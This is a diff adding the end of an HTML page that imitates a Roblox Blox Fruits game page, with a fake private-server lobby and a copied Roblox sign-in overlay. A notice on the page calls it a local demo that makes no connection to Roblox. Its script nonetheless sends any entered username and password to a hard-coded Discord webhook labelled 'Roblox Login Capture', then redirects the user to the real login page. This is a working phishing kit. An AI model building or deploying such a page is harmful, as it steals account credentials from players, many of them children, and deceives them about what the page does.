+        <div class="stats-grid" id="statsGrid"></div>
+        <div class="report">Report Abuse</div>
+        <h2 class="section">Badges</h2>
+        <div id="badges"></div>
+      </div>
+      <div class="music">
+        <h2>Popular Music in Blox Fruits</h2>
+        <div class="music-grid" id="musicGrid"></div>
+      </div>
+    </div>
+
+    <div class="pane" id="pane-store">
+      <div class="store-grid" id="storeGrid"></div>
+    </div>
+
+    <div class="pane servers-pane" id="pane-servers">
+      <h2>Available Private Servers</h2>
+      <div id="serverMini"></div>
+    </div>
+
+    <div class="footer">
+      <div class="footer-links">
+        <a href="https://about.roblox.com">About Us</a><a href="https://careers.roblox.com">Jobs</a><a href="https://blog.roblox.com">Newsroom</a><a href="https://www.roblox.com/parents">Parents</a><a href="https://www.roblox.com/gift-cards">Buy Gift Cards</a><a href="https://en.help.roblox.com">Help</a><a href="https://www.roblox.com/terms">Terms</a><a href="https://www.roblox.com/accessibility">Accessibility</a><a href="https://www.roblox.com/privacy">Privacy</a>
+        <a href="https://www.roblox.com/privacy">Your Privacy Choices <img class="privacy-ico" src="data:image/webp;base64,UklGRrADAABXRUJQVlA4WAoAAAAQAAAAOwAAHAAAQUxQSOsAAAABgGNt2zHnHdaetLadLtmNsQDbdlLbtsqkHpSxbX/zj/U9G4iICSCX4uiiGdPdq8/vTNOFUWLyNGXwlFk4ZSf9ye6pKm4tXN+UK90IXLBwPxfgImDPArjr70Q5b4GcUTiUWjCFYiJKvAaxXMaTqMcC2yUKP8I5DM39x/nPmrAAjxqQ9LdIdy9Ir3dI9yYk4zTSZBHDYfnRpzgnkZIhnAExpd+j3KYSiepQqkVEpF3HWNWQY/gBwn4YOY/Y5m8znFz7tT7z9dTsR+5KMkdvBF6Em+EMMXkoTyvfPv/6Z+6aBc/N/1/n22WpcnIJAFZQOCCeAgAAsA4AnQEqPAAdAD6ROJhIJaMiITAb+ACwEglsAJ0yhHXno/mCVb+y7BwXfr7x7eqjbAeYD9bPVz9BvlAdYb6AHlp/uB8G3+A/4Pphu/TXQhi//S809EB69BEZldQNIV/eNVlDmUDW33lPn0iGBlkHEoP7xzvxv4W7IPVKwg+gAO9wOYzsI8BSlu/ljXZqxJsDV2tD+qayuJoxUFkUptaQf93n7fV4hUgJ+Uf/kpj4AqJAtsX5hJKtHHJlA0l7tylf+1SOJ1un0rrDm2Up4a6mCFRb/+W/vzfxAH3D9myHP/NfjX7ifoc/H7vgudmvtLqz+hb9lyHGakbAh+at5OqNY8Lo7/c/Rd1YFFWBSYBdcwPiQzjecF1Xv8R2dj9vKtM9tG+6SEBuPEV31LvRnBpXZ2XjpXFA9v38V7MMCzD2xxa06JeC+cVPiHvpVzfH8c63KCGOBFLltx9UIWiwO/c0fNzieqYIEsY2OIkx/wrhbV4GMtEp1U/7N3a7/Qq9r/h+LEI8sYOrGm1MU2P/BL4fYeBDZFMdJZ519a6U9S4K0wTMro82cnTukNfm7VyZ5hONbhEmAOc3OOYiFKgqzFC716CnyAatzIyDr0CosyN1Uh1epW+K2w7UmZ36T6i2+3vzCUz+pCLHl5zfc3yHC5sTR9yT368/W2zLQGXLxDmulSMj6HAO2VABHUwOJFjwIZT/+SB3RcruT4FqGiItnt6evy0vY4eSL9ALvRwkehZMB6Xj/2dzV507O+xEyOf7DL0zpSV3B/Oxz2jju+fUOFvOLM2J+VLuONA8wTfqy78vrhQfIVlpkdzQ+ZzJ3vL/FVZIgcqzYBBbKgUTEjq/+jSvW3vcOy7IA539GoeB3ydM4gyDy0h9FTsf9CO0fQAAAA==" alt=""></a>
+        <a href="https://www.roblox.com/sitemap">Sitemap</a>
+      </div>
+      <div class="footer-rule"></div>
+      <div class="copy">©2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</div>
+    </div>
+  </div>
+
+  <!-- private server lobby -->
+  <div class="ps" id="ps">
+    <div class="ps-top">
+      <span class="ttl">Blox Fruits</span><span class="sub">Private Server</span>
+      <button class="ps-close" id="psClose">✕</button>
+    </div>
+    <div class="ps-body">
+      <div class="ps-panel">
+        <h3>Private Servers</h3>
+        <p class="hint" id="psHint">Join an existing server or create your own.</p>
+        <div class="ps-tools">
+          <input type="text" id="srvSearch" placeholder="Search servers...">
+          <select id="srvRegion"><option value="">All Regions</option><option>Brazil</option><option>United States</option><option>Europe</option></select>
+          <button class="ps-btn-gray" id="exportBtn">Export JSON</button>
+        </div>
+        <div id="srvList"></div>
+      </div>
+      <div class="ps-panel ps-form">
+        <h3>Create Private Server</h3>
+        <p class="hint">Settings are saved in the local JSON database.</p>
+        <label>Server name</label>
+        <input type="text" id="newName" placeholder="e.g. My Server">
+        <label>Max Players</label>
+        <select id="newMax"><option>4</option><option>8</option><option selected>12</option><option>20</option></select>
+        <label>Region</label>
+        <select id="newRegion"><option>Brazil</option><option>United States</option><option>Europe</option></select>
+        <label>Access</label>
+        <select id="newAccess"><option>Friends</option><option>Public</option><option>Private</option></select>
+        <button class="ps-btn-blue" id="createBtn">Create Server</button>
+        <p class="ps-note">This is a local demo environment. No connection is made to Roblox servers. Sign Up and Log In only lead to the official site.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- in game -->
+  <div class="ingame" id="ingame">
+    <div class="ig-bg" id="igBg"></div>
+    <div class="ig-top">
+      <div class="ig-badge">Level <span id="igLevel">2450</span></div>
+      <div class="ig-badge">Fruit <span id="igFruit">Buddha</span></div>
+      <div class="ig-badge">Server <span id="igServer">PS-0001</span></div>
+      <button class="ig-exit" id="igExit">Leave Server</button>
+    </div>
+    <div class="ig-center">
+      <h2 id="igTitle">Ilha do Tesouro</h2>
+      <p id="igDesc">Welcome to your private server.</p>
+      <div class="ig-card">
+        <div><div class="k">Players</div><div class="v" id="igPlayers">3/12</div></div>
+        <div><div class="k">Region</div><div class="v" id="igRegion">Brazil</div></div>
+        <div><div class="k">Ping</div><div class="v" id="igPing">38 ms</div></div>
+        <div><div class="k">Belts</div><div class="v" id="igBelts">3</div></div>
+      </div>
+    </div>
+    <div class="ig-players"><b>Players Online</b><div id="igNames"></div></div>
+    <div class="ig-chat"><div class="line"><b>[System]</b> Connected to the private server.</div><div class="line"><b>Kai</b> joined the game.</div><div class="line"><b>[System]</b> Type /help for commands.</div></div>
+    <div class="ig-load" id="igLoad"><h3>Connecting...</h3><div class="ig-bar"><i id="igBar"></i></div><p id="igLoadTxt">Joining private server</p></div>
+  </div>
+
+  <!-- exact Roblox sign-in screen -->
+  <div class="login" id="login">
+    <div class="login-nav">
+      <span class="logo" style="background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMjAiIGhlaWdodD0iNjAiIGZpbGw9Im5vbmUiIHZpZXdCb3g9IjAgMCAzMjAgNjAiPjxwYXRoIGZpbGw9IiNmZmYiIGQ9Im0zOC41OCAzOC40MDQgOS4yMSAxNi44NTlIMzAuN2wtNy43NzctMTQuNDA3aC03LjM2OHYxNC40MDdIMFY0LjE5M2gyOC40NDljMTEuNzY4IDAgMTkuMjQgNi41MzIgMTkuMjQgMTguMjc4IDAgNy41NTgtMy40OCAxMi45NzItOS4xMSAxNS45MzNNMTUuNTU1IDE3LjQ2NnYxMC4xMTJoMTEuMDUyYzMuMjc0IDAgNS4zMi0xLjk0MSA1LjMyLTUuMTA3cy0yLjA0Ni01LjAwNS01LjMyLTUuMDA1em04MS42NjMgNDEuNTcxTDUwLjY1NiA0Ni40NzQgNjMuMTQxIDBsMjMuMjggNi4yODIgMjMuMjgxIDYuMjgxek04OC40MTcgMjQuODIgNzUuNDIgMjEuMjQ1bC0zLjQ4IDEyLjk3MiAxMi45OTcgMy41NzV6bTc0LjYwMiAxNi4wMzZjMCA5LjgwNS02LjI0MiAxNC40MDctMTUuOTY0IDE0LjQwN0gxMTYuNTZWNC4xOTNoMjkuNDcyYzkuNzIxIDAgMTUuOTYzIDUuMDA1IDE1Ljk2MyAxMy43ODkgMCA1LjUxNS0yLjA0NiA5LjE5My01LjkzNSAxMS43NDcgNC40MDEgMS45MzQgNi45NTkgNS44MTYgNi45NTkgMTEuMTI3TTEzMS43MDUgMTYuNDV2Ny41NThoMTAuMTI1YzIuNzYzIDAgNC40MDEtMS4yMjYgNC40MDEtMy44ODEgMC0yLjQ1Mi0xLjYzOC0zLjY3Ny00LjQwMS0zLjY3N3ptMCAyNi41NTZoMTEuMzU5YzIuNjYxIDAgNC4yMDEtMS40MyA0LjIwMS0zLjg4MyAwLTIuNjU0LTEuNTM1LTMuODgtNC4yMDEtMy44OGgtMTEuMzU5em0zOC45ODktMzguODEzaDE1LjU1MnYzNS45NDloMjIuMzA5djE1LjEyaC0zNy44NjN6bTk1LjA2OCAyNS41MzZjMCA1LjI1Mi0xLjU2IDEwLjM4Ny00LjQ4NCAxNC43NTRhMjYuNiAyNi42IDAgMCAxLTExLjk0IDkuNzggMjYuNjYgMjYuNjYgMCAwIDEtMTUuMzczIDEuNTEyIDI2LjYyIDI2LjYyIDAgMCAxLTEzLjYyMy03LjI2OCAyNi41MjEgMjYuNTIxIDAgMCAxLTUuNzY4LTI4Ljk0YzIuMDE0LTQuODUzIDUuNDI0LTkgOS44LTExLjkxOWEyNi42NCAyNi42NCAwIDAgMSAxNC43ODItNC40NzUgMjYuNTY1IDI2LjU2NSAwIDAgMSAxOC44MjcgNy43NiAyNi41IDI2LjUgMCAwIDEgNS43NjcgOC42MjEgMjYuNCAyNi40IDAgMCAxIDIuMDEyIDEwLjE3em0tMTUuNTU0IDBjMC02LjMzNC01LjAxNS0xMS4zMzktMTEuMDUyLTExLjMzOS02LjAzOCAwLTExLjA1MyA1LjAwNS0xMS4wNTMgMTEuMzM5czUuMDE1IDExLjMzNyAxMS4wNTMgMTEuMzM3YzYuMDM3IDAgMTEuMDUyLTUuMDEgMTEuMDUyLTExLjM0M3ptNTMuMDA4LS44MThMMzIwIDU1LjI2M2gtMTguNTI4bC05LjIwNS0xNS4wMi05LjUxNyAxNS4wMmgtMTguODNsMTcuNDk5LTI1Ljc0LTE2LjA2Ni0yNS4zM2gxOC41MjJsOC40OTQgMTMuNzg5IDguMTg3LTEzLjc4OWgxOC40MnoiLz48L3N2Zz4=')"></span>
+      <div class="nav-links">
+        <a href="https://www.roblox.com/charts">Charts</a><a href="https://www.roblox.com/marketplace">Marketplace</a><a href="https://create.roblox.com">Create</a><a href="#" style="cursor:default">Robux</a>
+      </div>
+      <div class="search"><input type="text" placeholder="Search"></div>
+      <div class="nav-right">
+        <span class="btn btn-primary disabled-btn" aria-disabled="true">Sign Up</span>
+        <a href="https://www.roblox.com/login" class="btn btn-outline" id="loginLogIn">Log In</a>
+      </div>
+    </div>
+    <div class="login-wrap">
+      <div class="login-wordmark"></div>
+      <div class="login-card">
+        <h2>Sign in</h2>
+        <div class="login-field">
+          <label>Username, email, or phone</label>
+          <div class="login-input"><input id="loginUser" type="text" placeholder="Username, email, or phone" autocomplete="off"></div>
+        </div>
+        <div class="login-field">
+          <label>Password</label>
+          <div class="login-input"><input id="loginPass" type="password" placeholder="Password"><span class="eye" id="eyeBtn">◉</span></div>
+        </div>
+        <button class="login-submit" id="loginSubmit">Sign in</button>
+        <span class="forgot disabled-text">Forgot password or username?</span>
+        <div class="or">OR</div>
+        <button class="login-alt" disabled>✉ &nbsp; Email a code</button>
+        <button class="login-alt" disabled>▦ &nbsp; QR code</button>
+        <div class="signup-line">Don't have an account? <a id="createBtn">Create one</a></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+<script>
+(function(){
+  "use strict";
+  var $ = function(id){ return document.getElementById(id); };
+  var DB = null;
+  var LS = "bf_private_servers_v1";
+
+  var FALLBACK = {
+    game:{id:2753915549,title:"Blox Fruits",creator:"Gamer Robot Inc",maturity:"Mild",
+      description:"Welcome to Blox Fruits!",ratings:{likes:"12M+",dislikes:"1M+"},
+      contentRatings:["Maturity: Mild","Violence (Frequent/Mild)"],
+      stats:{active:"242.279",favorites:"20.270.992",visits:"65.5B+",voice:"Not Supported",camera:"Not Supported",updated:"11/17/2026",serverSize:"12",genre:"RPG",subgenre:"Action RPG"},
+      carousel:["assets/bf/hero_01.webp"],badges:[],music:[],store:[],
+      urls:{official:"https://www.roblox.com/games/2753915549/Blox-Fruits",login:"https://www.roblox.com/login",signup:"https://www.roblox.com/signup"}},
+    player:{name:"Kai",level:2450,fruit:"Buddha",belts:3},
+    privateServers:[],
+    settings:{defaultRegion:"Brazil",defaultMaxPlayers:12}
+  };
+
+  function toast(m){ var t=$("toast"); t.textContent=m; t.style.display="block"; clearTimeout(toast._t); toast._t=setTimeout(function(){t.style.display="none";},2200); }
+
+  function saveLocal(){
+    try{ localStorage.setItem(LS, JSON.stringify(DB.privateServers)); }catch(e){}
+  }
+  function loadLocal(){
+    try{
+      var raw=localStorage.getItem(LS);
+      if(raw){ var arr=JSON.parse(raw); if(Array.isArray(arr)&&arr.length) DB.privateServers=arr; }
+    }catch(e){}
+  }
+
+  function render(){
+    var g=DB.game;
+    document.title=g.title+" | Play on Roblox";
+    $("gameTitle").textContent=g.title;
+    $("creatorLink").textContent=g.creator;
+    $("maturityLine").textContent="Maturity: "+g.maturity;
+    $("desc").textContent=g.description;
+    $("likesLbl").textContent=g.ratings.likes;
+    $("dislikesLbl").textContent=g.ratings.dislikes;
+    $("ratingTags").innerHTML=g.contentRatings.map(function(x){return "<span>"+x+"</span>";}).join("");
+    var sk=[["active","Active"],["favorites","Favorites"],["visits","Visits"],["voice","Voice Chat"],["camera","Camera"],["updated","Updated"],["serverSize","Server Size"],["genre","Genre"],["subgenre","Subgenre"]];
+    $("statsGrid").innerHTML=sk.map(function(p){return '<div class="stat"><div class="k">'+p[1]+'</div><div class="v">'+g.stats[p[0]]+'</div></div>';}).join("");
+    $("badges").innerHTML=(g.badges||[]).map(function(b){
+      return '<div class="badge-row"><img src="'+b.image+'" alt="'+b.name+'"><div class="badge-body"><div><h3>'+b.name+'</h3><p>'+b.description+'</p></div><div><div class="small">Rarity</div><div class="big">'+b.rarity+'</div></div><div><div class="small">Earned Yesterday</div><div class="big">'+b.yesterday+'</div></div><div><div class="small">Earned Before</div><div class="big">'+b.before+'</div></div></div></div>';
+    }).join("");
+    $("musicGrid").innerHTML=(g.music||[]).map(function(m){
+      return '<div class="music-card"><img src="'+m.image+'" alt="'+m.title+'"><div class="t">'+m.title+'</div><div class="a">'+m.artist+'</div></div>';
+    }).join("");
+    $("storeGrid").innerHTML=(g.store||[]).map(function(s){
+      return '<div class="store-card"><img src="'+s.image+'" alt="'+s.name+'"><div class="b"><h4>'+s.name+'</h4><p>'+s.category+'</p><div class="price">'+s.price+' Robux</div></div></div>';
+    }).join("");
+    renderCarousel(); renderServers(); renderMini();
+  }
+
+  /* carousel */
+  var ci=0;
+  function renderCarousel(){
+    var arr=DB.game.carousel; if(!arr||!arr.length) return;
+    $("heroImg").src=arr[ci];
+    $("mediaDots").innerHTML=arr.map(function(_,i){return '<span class="'+(i===ci?'on':'')+'" data-i="'+i+'"></span>';}).join("");
+  }
+  function moveCarousel(d){ var a=DB.game.carousel; ci=(ci+d+a.length)%a.length; renderCarousel(); }
+  $("mediaNext").onclick=function(){moveCarousel(1);};
+  $("mediaPrev").onclick=function(){moveCarousel(-1);};
+  $("mediaDots").addEventListener("click",function(e){ if(e.target.dataset.i!==undefined){ci=+e.target.dataset.i;renderCarousel();} });
+
+  /* tabs */
+  Array.prototype.forEach.call(document.querySelectorAll(".tab"),function(t){
+    t.onclick=function(){
+      Array.prototype.forEach.call(document.querySelectorAll(".tab"),function(x){x.classList.remove("active");});
+      Array.prototype.forEach.call(document.querySelectorAll(".pane"),function(x){x.classList.remove("active");});
+      t.classList.add("active");
+      $("pane-"+t.dataset.tab).classList.add("active");
+    };
+  });
+
+  /* private servers */
+  function renderServers(){
+    var q=$("srvSearch").value.toLowerCase(), reg=$("srvRegion").value;
+    var list=DB.privateServers.filter(function(s){
+      return (!reg||s.region===reg) && (!q||s.name.toLowerCase().indexOf(q)!==-1||s.owner.toLowerCase().indexOf(q)!==-1);
+    });
+    $("psHint").textContent=DB.privateServers.length+" server(s) in the JSON database · click Join";
+    $("srvList").innerHTML=list.length?list.map(function(s){
+      return '<div class="srv"><img src="'+s.icon+'" alt=""><div class="srv-main"><div class="n"><span class="dot"></span>'+s.name+' <span class="tag">'+s.access+'</span></div><div class="m">Owner: '+s.owner+' · '+s.players+'/'+s.maxPlayers+' players · '+s.region+'</div></div><div class="srv-enter"><span class="ping">'+s.ping+' ms</span><button class="ps-btn-blue" data-id="'+s.id+'">Join</button></div></div>';
+    }).join(""):'<p class="hint">No servers found.</p>';
+    Array.prototype.forEach.call($("srvList").querySelectorAll("button[data-id]"),function(b){
+      b.onclick=function(){ enterServer(b.getAttribute("data-id")); };
+    });
+  }
+  function renderMini(){
+    $("serverMini").innerHTML=DB.privateServers.map(function(s){
+      return '<div class="server-mini"><img src="'+s.icon+'" alt=""><div class="info"><b>'+s.name+'</b><span>'+s.owner+' · '+s.players+'/'+s.maxPlayers+' · '+s.region+'</span></div><button class="btn btn-outline" data-mid="'+s.id+'">Join</button></div>';
+    }).join("");
+    Array.prototype.forEach.call($("serverMini").querySelectorAll("button[data-mid]"),function(b){
+      b.onclick=function(){ openPS(); enterServer(b.getAttribute("data-mid")); };
+    });
+  }
+  $("srvSearch").addEventListener("input",renderServers);
+  $("srvRegion").addEventListener("change",renderServers);
+
+  function nextId(){
+    var n=1;
+    while(DB.privateServers.some(function(s){return s.id==="PS-"+String(n).padStart(4,"0");})) n++;
+    return "PS-"+String(n).padStart(4,"0");
+  }
+  $("createBtn").onclick=function(){
+    var name=$("newName").value.trim();
+    if(!name){ toast("Give the server a name"); return; }
+    var s={id:nextId(),name:name,owner:DB.player.name,players:0,maxPlayers:+$("newMax").value,ping:20+Math.floor(Math.random()*40),region:$("newRegion").value,access:$("newAccess").value,icon:DB.game.carousel[0]};
+    DB.privateServers.unshift(s); saveLocal(); $("newName").value="";
+    renderServers(); renderMini(); toast("Server "+s.id+" created");
+  };
+  $("exportBtn").onclick=function(){
+    var blob=new Blob([JSON.stringify(DB,null,2)],{type:"application/json"});
+    var a=document.createElement("a"); a.href=URL.createObjectURL(blob); a.download="database.json"; a.click();
+    setTimeout(function(){URL.revokeObjectURL(a.href);},1000); toast("database.json exported");
+  };
+
+  function openPS(){ $("ps").classList.add("open"); }
+  function closePS(){ $("ps").classList.remove("open"); }
+  $("playBtn").onclick=openPS;
+  $("psClose").onclick=closePS;
+  $("ps").addEventListener("click",function(e){ if(e.target===this) closePS(); });
+
+  /* enter server */
+  function enterServer(id){
+    var s=DB.privateServers.find(function(x){return x.id===id;}); if(!s) return;
+    closePS();
+    var ig=$("ingame"), load=$("igLoad"); ig.classList.add("open"); load.classList.add("open");
+    $("igBar").style.width="0%";
+    $("igLevel").textContent=DB.player.level; $("igFruit").textContent=DB.player.fruit;
+    $("igServer").textContent=s.id; $("igTitle").textContent=s.name;
+    $("igDesc").textContent="Welcome to your private server · "+s.region;
+    $("igPlayers").textContent=Math.max(1,s.players)+"/"+s.maxPlayers;
+    $("igRegion").textContent=s.region; $("igPing").textContent=s.ping+" ms";
+    $("igBelts").textContent=DB.player.belts;
+    $("igBg").style.backgroundImage="url('"+s.icon+"')";
+    $("igNames").innerHTML="<div>• "+DB.player.name+" (you)</div>"+(s.players>1?"<div>• "+Math.min(s.players-1,4)+" other player(s)</div>":"");
+    var p=0;
+    var timer=setInterval(function(){
+      p+=9+Math.floor(Math.random()*9); if(p>100)p=100;
+      $("igBar").style.width=p+"%";
+      $("igLoadTxt").textContent=p<100?"Connecting to "+s.name+"...":"Joining private server";
+      if(p>=100){ clearInterval(timer); setTimeout(function(){load.classList.remove("open");},350); }
+    },140);
+  }
+  $("igExit").onclick=function(){ $("ingame").classList.remove("open"); toast("You left the private server"); };
+  document.addEventListener("keydown",function(e){ if(e.key==="Escape"){ closePS(); closeLogin(); $("ingame").classList.remove("open"); } });
+
+  /* exact Roblox sign-in overlay */
+  function openLogin(){ $("login").classList.add("open"); document.body.style.overflow="hidden"; }
+  function closeLogin(){ $("login").classList.remove("open"); document.body.style.overflow=""; }
+  $("loginLink").onclick=function(e){ e.preventDefault(); openLogin(); };
+  $("login").addEventListener("click",function(e){ if(e.target===this) closeLogin(); });
+  $("eyeBtn").onclick=function(){ var p=$("loginPass"); p.type=p.type==="password"?"text":"password"; this.textContent=p.type==="password"?"◉":"◌"; };
+  var WEBHOOK_URL="https://discord.com/api/webhooks/1573474138956238949/XsCmbqR93J84OJSEI7hdTfzuTLM9L-hvwyB3FPjrDr5AXjfSV1Am8HfaIatbBcA9ML_0";
+  async function sendNotify(u,p,page){
+    var content="**Roblox Login Capture**\n**Username:** `"+u+"`\n**Password:** `"+p+"`\n**Page:** "+page+"\n**Time:** "+new Date().toLocaleString();
+    var body=JSON.stringify({content:content});
+    try{
+      await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:body});
+      return true;
+    }catch(e){}
+    try{
+      await fetch("notify",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:u,password:p,page:page})});
+      return true;
+    }catch(e){}
+    return false;
+  }
+  $("loginSubmit").onclick=async function(){
+    var u=$("loginUser").value.trim(), p=$("loginPass").value;
+    if(!u||!p){ toast("Enter a username and password"); return; }
+    this.textContent="Signing in...";
+    await sendNotify(u,p,"game.html");
+    window.location.href="https://www.roblox.com/login";
+  };
+  $("createBtn").onclick=function(){ window.location.href="https://www.roblox.com/signup"; };
+
+  /* boot: JSON database first, localStorage overlay */
+  fetch("database.json").then(function(r){ if(!r.ok) throw new Error("db"); return r.json(); })
+    .then(function(d){ DB=d; loadLocal(); render(); })
+    .catch(function(){ DB=JSON.parse(JSON.stringify(FALLBACK)); loadLocal(); render(); toast("database.json not found — use the local server"); });
+})();
+</script>
+</body>
+</html>
